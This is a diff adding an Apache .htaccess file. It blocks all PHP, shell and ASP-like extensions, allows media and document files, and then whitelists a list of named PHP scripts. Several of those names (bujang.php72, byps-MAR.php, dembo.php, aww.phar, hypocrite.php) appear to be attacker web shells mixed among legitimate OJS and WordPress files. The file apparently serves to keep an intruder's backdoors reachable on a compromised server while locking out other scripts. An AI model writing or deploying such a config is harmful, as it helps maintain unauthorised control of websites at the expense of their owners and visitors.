@@ -1,0 +1,77 @@
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.SH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.AS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.As*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.aS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.as*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.inc*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.ctp*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pgif*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<FilesMatch "\.(jpg|jpeg|png|gif|svg|bmp|ico|webp|heic)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(mp4|webm|avi|mov|wmv|mp3|wav|ogv|ogg)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv|)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "^(index.php|suer.php|bujang.php72|bujang-MAR.php72|Controllers.php|config.enc.php|COUNTER_Robots_list.php|NativeXmlSubmissionFileUpload.inc.php|error-MAR.Php|byps-MAR.php|tol-MAR.php|error.php|byps.php|wp-mail.php|submissions.php|PKPImportExportListeners.php|PKPFileSizeUnits.php|Configuration.php|TokenFactory.php|529.blade.php|fc-pluginSettings-1-pluginupdatenotificationpiugin.php|dembo.php|JournaldataOAI.php|OJSPaymentDataset.inc.php|wp-login.php|aww.phar|hypocrite.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+Options -Indexes
